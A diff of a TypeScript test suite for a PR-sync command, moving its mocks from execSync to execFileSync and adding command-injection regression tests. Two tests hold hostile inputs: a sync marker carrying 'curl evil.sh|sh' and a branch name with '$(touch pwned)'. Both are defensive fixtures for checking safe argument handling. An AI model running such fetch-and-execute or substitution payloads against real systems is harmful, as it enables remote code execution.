@@ -214,19 +214,13 @@ fix description`
     })
 
   it('detects PR from --pr flag and syncs body + comment', async () => {
-    // Set up execSync responses
-    mockExecSync.mockImplementation((cmd: string, _opts?: any) => {
-      if (cmd.includes('gh --version')) return 'gh version 2.47.0'
-      if (cmd.includes('gh pr view 202 --json baseRefName')) return 'main'
-      if (cmd.includes('gh api repos')) return 'existing body'
-      if (cmd.includes('git rev-parse HEAD')) return 'currentsha123'
-      if (cmd.includes('git merge-base')) return 'basesha123'
-      if (cmd.includes('git log')) return '---COMMIT---\nnewsha\nAuthor\na@b.com\n2024-06-01\nfeat: test commit'
-      return ''
-    })
     mockExecFileSync.mockImplementation((cmd: string, args: string[]) => {
+      if (cmd === 'gh' && args[0] === '--version') return 'gh version 2.47.0'
+      if (cmd === 'gh' && args[0] === 'pr' && args[1] === 'view') return 'main'
+      if (cmd === 'gh' && args[0] === 'api' && args[1].includes('pulls/202')) return 'existing body'
       if (cmd === 'git' && args[0] === 'merge-base') return 'basesha123'
       if (cmd === 'git' && args[0] === 'log') return '---COMMIT---\nnewsha\nAuthor\na@b.com\n2024-06-01\nfeat: test commit'
+      if (cmd === 'git' && args[0] === 'rev-list') return 'currentsha123'
       return ''
     })
 
@@ -241,16 +235,13 @@ fix description`
   })
 
   it('exits cleanly when no new commits since last sync', async () => {
-    mockExecSync.mockImplementation((cmd: string, _opts?: any) => {
-      if (cmd.includes('gh --version')) return 'gh version 2.47.0'
-      if (cmd.includes('gh pr view 202 --json baseRefName')) return 'main'
-      if (cmd.includes('gh api repos')) return '<!-- pr-sync: sha=currentsha123 -->'
-      if (cmd.includes('git rev-parse HEAD')) return 'currentsha123'
-      return ''
-    })
     mockExecFileSync.mockImplementation((cmd: string, args: string[]) => {
+      if (cmd === 'gh' && args[0] === '--version') return 'gh version 2.47.0'
+      if (cmd === 'gh' && args[0] === 'pr' && args[1] === 'view') return 'main'
+      if (cmd === 'gh' && args[0] === 'api' && args[1].includes('pulls/202')) return '<!-- pr-sync: sha=currentsha123 -->'
       if (cmd === 'git' && args[0] === 'merge-base') return 'basesha123'
       if (cmd === 'git' && args[0] === 'log') return ''
+      if (cmd === 'git' && args[0] === 'rev-list') return 'currentsha123'
       return ''
     })
 
@@ -261,15 +252,13 @@ fix description`
   })
 
   it('rejects an injected marker SHA and never passes it to git', async () => {
-    mockExecSync.mockImplementation((cmd: string, _opts?: any) => {
-      if (cmd.includes('gh --version')) return 'gh version 2.47.0'
-      if (cmd.includes('gh pr view 202 --json baseRefName')) return 'main'
-      if (cmd.includes('gh api repos')) return '<!-- pr-sync: sha=deadbeef; curl evil.sh|sh -->'
-      if (cmd.includes('git merge-base')) return 'basesha123'
-      return ''
-    })
     mockExecFileSync.mockImplementation((cmd: string, args: string[]) => {
+      if (cmd === 'gh' && args[0] === '--version') return 'gh version 2.47.0'
+      if (cmd === 'gh' && args[0] === 'pr' && args[1] === 'view') return 'main'
+      if (cmd === 'gh' && args[0] === 'api' && args[1].includes('pulls/202')) return '<!-- pr-sync: sha=deadbeef; curl evil.sh|sh -->'
+      if (cmd === 'git' && args[0] === 'merge-base') return 'basesha123'
       if (cmd === 'git' && args[0] === 'log') return ''
+      if (cmd === 'git' && args[0] === 'rev-list') return 'currentsha123'
       return ''
     })
 
@@ -277,18 +266,38 @@ fix description`
     await prSync(['--pr', '202', '--dry-run'])
 
     expect(output).toContain('Malformed sync marker SHA ignored')
-    const allShellCommands = mockExecSync.mock.calls.map((c: string[]) => c[0]).join('\n')
     const allFileArgs = mockExecFileSync.mock.calls.map((c: string[]) => c[1].join(' ')).join('\n')
-    expect(allShellCommands).not.toContain(';')
-    expect(allShellCommands).not.toContain('curl')
     expect(allFileArgs).not.toContain(';')
     expect(allFileArgs).not.toContain('curl')
     expect(output).toContain('No new commits since last sync.')
   })
 
+  it('passes a hostile branch name to gh pr list as a literal argument', async () => {
+    const hostile = 'x"$(touch pwned)"'
+    mockExecFileSync.mockImplementation((cmd: string, args: string[]) => {
+      if (cmd === 'gh' && args[0] === '--version') return 'gh version 2.47.0'
+      if (cmd === 'git' && args[0] === 'rev-parse') return hostile
+      if (cmd === 'gh' && args[0] === 'pr' && args[1] === 'list') return ''
+      return ''
+    })
+
+    const { prSync } = await import('../../src/commands/prSync.js')
+    await prSync(['--dry-run'])
+
+    expect(output).toContain('No open PR detected')
+    const prListCalls = mockExecFileSync.mock.calls.filter((c: string[]) => c[0] === 'gh' && c[1][0] === 'pr' && c[1][1] === 'list')
+    expect(prListCalls.length).toBe(1)
+    // the hostile string must travel as exactly ONE literal array element
+    expect(prListCalls[0][1]).toContain(hostile)
+    const allElements = mockExecFileSync.mock.calls.flatMap((c: string[]) => c[1])
+    expect(allElements.filter((a: string) => a === hostile).length).toBe(1)
+    // and never as part of a larger, shell-interpretable string
+    expect(allElements.filter((a: string) => a.includes('$(touch pwned)') && a !== hostile).length).toBe(0)
+  })
+
   it('exits with error when gh is not available', async () => {
-    mockExecSync.mockImplementation((cmd: string, _opts?: any) => {
-      if (cmd.includes('gh --version')) throw new Error('not found')
+    mockExecFileSync.mockImplementation((cmd: string, _args: string[]) => {
+      if (cmd === 'gh' && _args[0] === '--version') throw new Error('not found')
       return ''
     })
 
@@ -298,10 +307,10 @@ fix description`
   })
 
   it('exits cleanly when no PR is found', async () => {
-    mockExecSync.mockImplementation((cmd: string, _opts?: any) => {
-      if (cmd.includes('gh --version')) return 'gh version 2.47.0'
-      if (cmd.includes('git rev-parse --abbrev-ref HEAD')) return 'feature-branch'
-      if (cmd.includes('gh pr list --head')) return ''
+    mockExecFileSync.mockImplementation((cmd: string, args: string[]) => {
+      if (cmd === 'gh' && args[0] === '--version') return 'gh version 2.47.0'
+      if (cmd === 'git' && args[0] === 'rev-parse') return 'feature-branch'
+      if (cmd === 'gh' && args[0] === 'pr' && args[1] === 'list') return ''
       return ''
     })
 
